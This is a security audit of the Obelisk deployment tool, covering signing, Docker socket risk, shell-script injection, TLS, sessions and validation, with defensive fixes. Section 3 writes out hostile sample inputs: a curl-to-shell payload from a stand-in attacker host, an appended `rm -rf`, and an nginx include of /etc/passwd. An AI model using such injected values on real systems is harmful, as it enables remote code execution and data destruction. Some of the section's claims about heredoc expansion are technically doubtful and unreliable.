# Obelisk Security & Architecture Audit — 2026-06-12

## Executive Summary

Obelisk has a genuinely well-designed authentication core. The ED25519 request-signing model is correct, carefully implemented, and meaningfully stronger than the API-key or bearer-token patterns most tools ship with. The argon2id password storage is textbook. The nonce/replay cache is subtly well-built.

The vulnerabilities that exist are almost entirely in the *operational layer* sitting around that strong core: the shell scripts that generate configs, the container that runs as root with the Docker socket, the missing `Secure` cookie flag, the missing nginx rate limits. These are all fixable without touching the cryptographic design.

Priority ordering: fix the shell injection and the Docker socket exposure first — both are exploitable in realistic scenarios. Everything else is hardening.

---

## 1. Authentication & Request Signing

**Verdict: Strong. A few low-friction improvements available.**

The ED25519 signed-request protocol is the right design for this use case. Every CLI request carries a canonical string that covers the method, path, timestamp, nonce, and body hash — tampering with any of these invalidates the signature. The verification order (timestamp → key lookup → signature → nonce) is correct; the nonce is committed to the replay cache only *after* signature verification, which prevents cache-pollution attacks from forged requests.

### Issues

**Nonce is 128 bits — increase to 256.** (`internal/client/client.go`)
The current 16-byte nonce is cryptographically acceptable but below the 256-bit floor that modern security standards expect for long-lived systems. The change is one line and zero user impact.

```go
// Current
b := make([]byte, 16)
// Fix
b := make([]byte, 32)
```

**The timestamp window and nonce cache have a gap.** The timestamp window is ±60s; the nonce cache is 120s. This means a captured request can technically be replayed at the tail of the timestamp window and the replay cache won't have expired yet — there's a narrow window (around seconds 61–120 after capture) where both checks pass. In practice, a deploy script running twice in sequence is idempotent, so the real-world impact is low. But tighten it: extend the nonce cache to `3 × timestamp_window` (180s) to guarantee full coverage with zero gap.

**No rate limiting on `/_obelisk/` at nginx.** The auth middleware does rate-limit its own error *logging* (100 lines/min), but a brute-force or DoS against the ED25519 verification loop itself has no nginx-layer gate. Add a `limit_req_zone` directive:

```nginx
limit_req_zone $binary_remote_addr zone=obelisk_api:10m rate=30r/m;

location /_obelisk/ {
    limit_req zone=obelisk_api burst=10 nodelay;
    proxy_pass http://obelisk-agent:9100/;
}
```

30 requests/minute per IP is generous for legitimate CLI use and stops automated probing.

---

## 2. Docker Socket & Container Security

**Verdict: The biggest systemic risk. Accept it deliberately, not accidentally.**

The agent container mounts `/var/run/docker.sock` and runs as root. This is effectively equivalent to giving any authorized key holder root on the host machine. That's an acceptable design choice for a tool whose explicit purpose is to run and manage containers — but it should be a *documented, deliberate* decision with mitigations in place, not an afterthought.

### Issues

**Agent runs as root (no `USER` directive in Dockerfile).** Every process inside the container — including anything invoked by `.obelisk/run.sh` — runs as uid 0. Combined with the Docker socket mount, this means a compromised deploy script can escape the container entirely.

Add a non-root user to the Dockerfile:
```dockerfile
RUN addgroup -S obelisk && adduser -S -G obelisk obelisk
# ... after COPY binaries ...
USER obelisk
```
Note: the Docker socket *still* needs to be accessible. You either keep the `docker` group on the user, or use the socket proxy approach below.

**The Docker socket grants full daemon control.** Anyone who can write to the socket can launch privileged containers, mount host paths, read any volume, extract secrets from other containers, and escape to the host. The agent uses it for `docker stack deploy`, `docker service scale`, and `docker service logs`. The blast radius of a compromised authorized key is therefore: full host access.

The correct mitigation for production is a **Docker Socket Proxy** ([Tecnativa/docker-socket-proxy](https://github.com/Tecnativa/docker-socket-proxy)). It acts as a locked-down gateway that only allows the specific Docker API calls you need:

```yaml
services:
  docker-proxy:
    image: tecnativa/docker-socket-proxy
    environment:
      SERVICES: 1    # docker service *
      TASKS: 1       # docker stack ps
      NETWORKS: 1    # network inspection
      NODES: 0       # no node management
      CONFIGS: 0
      SECRETS: 0
      CONTAINERS: 1  # needed for docker exec nginx reload
      POST: 1        # allow POST (write operations)
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock:ro
    networks:
      - agent-internal

  obelisk-agent:
    environment:
      DOCKER_HOST: tcp://docker-proxy:2375
    # No direct socket mount needed
```

This constrains what a compromised agent can do to the daemon. It's not a complete mitigation (SERVICES+POST+CONTAINERS is still powerful) but it eliminates the most dangerous primitives (VOLUMES, SECRETS, privileged container launch).

**No resource limits.** A runaway deploy or a compromised container can consume all CPU and memory on the host. Add limits to the Swarm `deploy:` stanza:

```yaml
deploy:
  resources:
    limits:
      cpus: '1.0'
      memory: 512M
    reservations:
      cpus: '0.25'
      memory: 128M
```

**No `no-new-privileges` security option.** Add to all services:
```yaml
security_opt:
  - no-new-privileges:true
```
This prevents any binary inside the container from gaining elevated privileges via setuid/setgid bits.

---

## 3. Shell Injection in Generate Scripts

**Verdict: Critical. Fix before any production use with untrusted obelisk.yml content.**

`generate-compose.sh` and `generate-nginx.sh` read values from `obelisk.yml` via `yq` and embed them directly into shell heredocs without quoting. If `obelisk.yml` contains values with shell metacharacters — whether through a typo, a malicious module definition, or an attacker who gains write access to the config file — those characters execute.

### Vulnerable patterns

```sh
# generate-compose.sh — unquoted substitution inside heredoc
cat >> docker-compose.override.yml << YAML
  ${name}:
    image: ${image}    # image="nginx:latest; rm -rf /obelisk" executes
    expose:
      - "${port}"
YAML

# generate-nginx.sh — same problem
    server_name ${domain};      # domain="evil.com; include /etc/passwd;" injects nginx config
    proxy_pass http://${name}:${port};
```

The heredoc delimiter is unquoted (`<< YAML` not `<< 'YAML'`), which means variable expansion and command substitution happen inside it. A value like `$(curl attacker.com/payload | sh)` in any field would execute during config generation.

### Fix

1. **Validate all `yq`-extracted values before use.** Add a validation function at the top of each script:

```sh
validate_name() {
    echo "$1" | grep -qE '^[A-Za-z0-9_-]+$' || {
        echo "[Obelisk] error: invalid value '$1' — only alphanumeric, hyphen, underscore allowed" >&2
        exit 1
    }
}
validate_domain() {
    echo "$1" | grep -qE '^[A-Za-z0-9._-]+$' || {
        echo "[Obelisk] error: invalid domain '$1'" >&2
        exit 1
    }
}
validate_port() {
    echo "$1" | grep -qE '^[0-9]+$' || {
        echo "[Obelisk] error: invalid port '$1'" >&2
        exit 1
    }
}
```

2. **Quote heredoc delimiters** to prevent variable expansion in the body itself: `<< 'YAML'` instead of `<< YAML`.

3. **Validate image references** — allow only registry/image:tag format, no shell characters.

The module name is already validated in Go (`^[A-Za-z0-9_-]+$` in `deploy.go` and `scale.go`). The shell scripts need the same fence.

---

## 4. TLS & HTTPS Posture

**Verdict: The foundation is there; gaps need closing before production.**

The design correctly terminates TLS at nginx and keeps all internal traffic on plain HTTP within the Docker network. The CLI enforces HTTPS for non-localhost URLs. These are the right choices.

### Issues

**The nginx config generated by `generate-nginx.sh` is HTTP-only.** Every `.conf` file written to `.obelisk/nginx/` gets a `listen 80` block and nothing else. There are no redirect blocks, no HTTPS server blocks, no TLS certificate paths. This means deployed modules are served over plain HTTP even when nginx has certificates.

The generated config should include both an HTTP-to-HTTPS redirect and an HTTPS block:

```nginx
server {
    listen 80;
    server_name ${domain};
    location /.well-known/acme-challenge/ { root /var/www/certbot; }
    location / { return 301 https://$host$request_uri; }
}
server {
    listen 443 ssl;
    server_name ${domain};
    ssl_certificate /etc/letsencrypt/live/${domain}/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/${domain}/privkey.pem;
    # proxy_pass ...
}
```

Gate the HTTPS block on cert existence; fall back to HTTP-only if no cert is present yet (first-boot scenario before certbot runs).

**Certbot is not part of the current Swarm stack.** The old docker-compose.yml had a certbot service. The current Swarm version (`obelisk/docker-compose.yml`) has none. Certificate renewal has no home. This needs to be restored as a Swarm service — or replaced with a Caddy reverse proxy that handles TLS automatically.

**The JWT cookie does not set the `Secure` flag.** (`cmd/obelisk-auth/handlers.go`)
```go
http.SetCookie(w, &http.Cookie{
    Name:     jwt.CookieName,
    HttpOnly: true,
    SameSite: http.SameSiteLaxMode,
    // Secure: true — MISSING
})
```
Without `Secure: true`, the browser will send the session token over plain HTTP. The server is behind TLS in production, but the cookie itself should declare it. Add `Secure: true` and gate it on an `OBELISK_HTTPS=true` env var if you want to keep dev working over HTTP.

**No HSTS header.** Once TLS is stable, add to nginx:
```nginx
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
```

**Bootstrap TLS is unresolved.** `PLAN_SERVER_PROVISIONING.md §5` notes: *"self-signed bootstrap cert vs HTTP-on-IP for the initial ping — to be finalized in implementation."* This needs a decision before server provisioning ships. Recommendation: use HTTP-on-IP for the initial signed ping only (the signature itself provides integrity), then require HTTPS for all subsequent CLI operations once a domain is pointed.

---

## 5. Session Management (Web Console)

**Verdict: Acceptable for a small-team admin tool; a few targeted hardening steps are worth it.**

The stateless JWT approach is reasonable for an admin tool. The argon2id password hashing is strong. The key rotation on `auth.pub` file change is a nice touch that avoids restart-to-invalidate patterns.

### Issues

**Logout doesn't invalidate the token server-side.** The logout handler clears the cookie but the JWT remains valid until expiry. A stolen cookie (XSS, shoulder surf, packet capture on HTTP) gives 24 hours of access. Options in order of complexity:
- **Short TTL**: Reduce default to 2–4 hours. Low effort, meaningful improvement.
- **Token blocklist**: Keep a small in-memory set of revoked JTIs (JWT IDs) until their expiry. Cheap for a single-server tool with few users.
- **Re-auth on sensitive actions**: Force re-authentication before key management operations (add/revoke). Already works via the form flow.

**No CSRF token on the login form.** `SameSite=Lax` provides meaningful protection against cross-origin form POSTs but is not a complete CSRF defense (navigational GETs still carry the cookie under Lax mode). For an admin tool with a login form, this is acceptable — but for the key management and scale forms, a synchronizer token is worth adding. The pattern is a hidden `<input name="csrf" value="{{.CSRFToken}}">` generated server-side and validated on POST.

**`obelisk-auth` passes `OBELISK_ADMIN_PASSWORD` as an environment variable.** Environment variables are visible in `docker inspect`, `/proc/<pid>/environ`, and some log sinks. The password is immediately hashed on startup and stored in `users.json`, so the window is narrow — but it's still a plaintext credential in the process environment. Consider accepting it via a file path (`OBELISK_ADMIN_PASSWORD_FILE`) so it can be written to a mode-600 file or a Docker secret.

---

## 6. Private Key & Secret Management

**Verdict: Acceptable for v1; documented limitations should drive v2 priorities.**

### Issues

**The ED25519 private key is stored unencrypted at `~/.config/obelisk/id_ed25519`.** File permissions are `0600`, which is the right default, but no passphrase protects the key material at rest. A stolen laptop, cold-boot attack, or VM snapshot exposes the key directly.

This is a known deferred item. When you implement it: use `golang.org/x/crypto/argon2` to derive an encryption key from the passphrase, then wrap the ED25519 seed with `golang.org/x/crypto/chacha20poly1305`. The PEM block type can be `ENCRYPTED PRIVATE KEY` with the argon2 parameters stored in the block headers. Only prompt for the passphrase once per session (cache in an in-memory keychain).

**The server registry (`~/.config/obelisk/servers.yml`) has no integrity check.** A local attacker (malware, shared machine) can modify it to point at a malicious server. All subsequent `obelisk deploy` calls sign requests and send them to the wrong endpoint. The fix is a detached HMAC-SHA256 of the registry file, keyed by the local private key. If the signature doesn't match on load, refuse to proceed and prompt the user to re-add their servers.

**AWS credentials in `.env` are long-lived IAM user keys.** The `.env.example` documents `AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY`. For EC2 deployments, these should be replaced with an IAM instance role so no credentials are stored at all. For non-EC2 scenarios, use short-lived STS tokens (`aws sts assume-role`) rather than static keys.

---

## 7. Network Architecture

**Verdict: Well-structured; one configuration decision worth revisiting.**

The internal network topology is correct: nginx is the only public-facing process; agent/auth/web communicate over the internal Docker overlay network; the CLI reaches the agent only through the nginx `/_obelisk/` proxy path.

### Issues

**The overlay network has `attachable: true`.** This flag allows containers outside the Swarm stack to join the `obelisk` overlay network — it's needed for `obelisk dev` to work (regular Compose containers need to attach). In production, `attachable: true` means any container on the Docker host can join the network and talk to nginx, the agent, auth, and web on their internal ports. For a dedicated server this is acceptable (there should be no other containers). For shared infrastructure or a multi-tenant future, remove `attachable: true` and use explicit network membership.

**No `/_obelisk/` rate limiting in the current nginx config.** Covered in §1 — both the `/_obelisk/` management path and the generated module proxy configs currently have no rate limiting. The auth plan specifies it; it's not implemented yet.

**The `obelisk.yml` agent module and the management API run on different ports (8001 vs 9100) with no documentation explaining why.** The agent is simultaneously an Obelisk module (served at `agent.localhost:8001`) and a management server (accessed at `/_obelisk/:9100`). This dual-role is worth explicitly documenting so it doesn't confuse future contributors — or consolidate to one port.

---

## 8. Deployment Script Security

**Verdict: The scripts do their job; a few operational hardening steps are missing.**

**`run.sh` does not verify that Docker Swarm is initialized before calling `docker stack deploy`.** If setup.sh wasn't run, the deploy silently fails with a cryptic Docker error. Add a preflight check:

```sh
if ! docker info --format '{{.Swarm.LocalNodeState}}' 2>/dev/null | grep -q 'active'; then
    echo "[Obelisk] error: Docker Swarm not initialized. Run .obelisk/setup.sh first." >&2
    exit 1
fi
```

**`setup.sh` uses `--advertise-addr 127.0.0.1` for Swarm init.** Correct for single-node, but breaks multi-node: no worker can reach a loopback manager address. Document this prominently, and have `obelisk server new` set the correct advertise address based on the instance's actual IP.

**`generate-nginx.sh` removes all `.conf` files before regenerating.** If generation fails partway through (disk full, yq error), nginx is left with an empty config dir and all module traffic fails. Generate into a temp dir first, then atomically `mv` on success.

---

## 9. Input Validation Gaps

**Verdict: The API layer is well-validated. The shell layer is not (see §3).**

**No upper bound on `replicas` in the scale endpoint.** (`obelisk-agent/internal/api/scale.go`)
```go
if req.Replicas < 0 {  // Only lower bound — missing upper bound
```
Setting `replicas=10000` would exhaust host memory. Add `req.Replicas > 100` → reject.

**Key `Name` field is not length-capped.** (`obelisk-agent/internal/api/keys.go`)
A multi-megabyte key name passes validation and persists to `allowed_keys.json`. Add `len(body.Name) > 256` → reject.

**No length check on the `module` field in the deploy endpoint.** The regex constrains characters but not length. Add `len(req.Module) > 64` → reject.

---

## 10. Operational Gaps

### Audit Logging
The agent has good server-side audit logging. The CLI has none. Add a local log at `~/.config/obelisk/audit.log` — timestamp, server name, command, outcome — so there's a client-side record if a key is ever compromised.

### Certificate Renewal
Certbot was dropped from the stack during the Swarm migration. No TLS cert renewal exists. Must be restored before production deployment — either as a Swarm certbot service (renewing every 12h) or by switching nginx to **Caddy**, which handles renewal automatically and generates far simpler configs. Caddy's HTTP API also means nginx reloads become API calls rather than `docker exec`, removing the need to find the container ID in `run.sh`.

### Health Checks
No `healthcheck:` directives in any service. Swarm's `on-failure` restart policy only triggers on process exit, not on a hung agent. Add:

```yaml
healthcheck:
  test: ["CMD", "wget", "-qO-", "http://localhost:9100/v1/ping"]
  interval: 30s
  timeout: 5s
  retries: 3
  start_period: 10s
```

---

## Quick Wins (Do This Week)

| # | Fix | File | Effort |
|---|-----|------|--------|
| 1 | Nonce size → 32 bytes | `obelisk-cli/internal/client/client.go` | 1 line |
| 2 | `Secure: true` on JWT cookies (gated on `OBELISK_HTTPS`) | `obelisk-agent/cmd/obelisk-auth/handlers.go` | 2 lines |
| 3 | Replicas upper bound (`> 100`) | `obelisk-agent/internal/api/scale.go` | 2 lines |
| 4 | Key name length cap (`> 256`) | `obelisk-agent/internal/api/keys.go` | 2 lines |
| 5 | Module name length cap in deploy (`> 64`) | `obelisk-agent/internal/api/deploy.go` | 2 lines |
| 6 | nginx rate limiting on `/_obelisk/` | nginx config template | 5 lines |
| 7 | Swarm preflight in `run.sh` | `obelisk/` + `obelisk-cli/cmd/init.go` template | 4 lines |
| 8 | `no-new-privileges: true` on all services | `obelisk-agent/docker-compose.yml` | 2 lines/service |
| 9 | Validate yq values in generate scripts | `generate-compose.sh`, `generate-nginx.sh` + templates | ~20 lines |

## Medium-Term (Next Month)

10. Docker Socket Proxy (Tecnativa) replacing direct socket mount
11. Non-root user in Dockerfile (`USER obelisk`)
12. Restore certbot service, or evaluate Caddy migration
13. HTTPS + redirect blocks in generated nginx configs
14. Registry file HMAC integrity check (`servers.yml`)
15. Reduce JWT TTL default to 2–4 hours
16. `OBELISK_ADMIN_PASSWORD_FILE` support

## Longer-Term (Before GA)

17. Passphrase-protected private key storage (argon2 + chacha20poly1305)
18. Server certificate pinning / TOFU on first `server add`
19. CSRF synchronizer tokens on key management and scale forms
20. Per-key role scoping (deploy-only vs admin) — already planned in auth plan §v2
21. Local CLI audit log
22. Atomic nginx config generation (temp dir → mv)
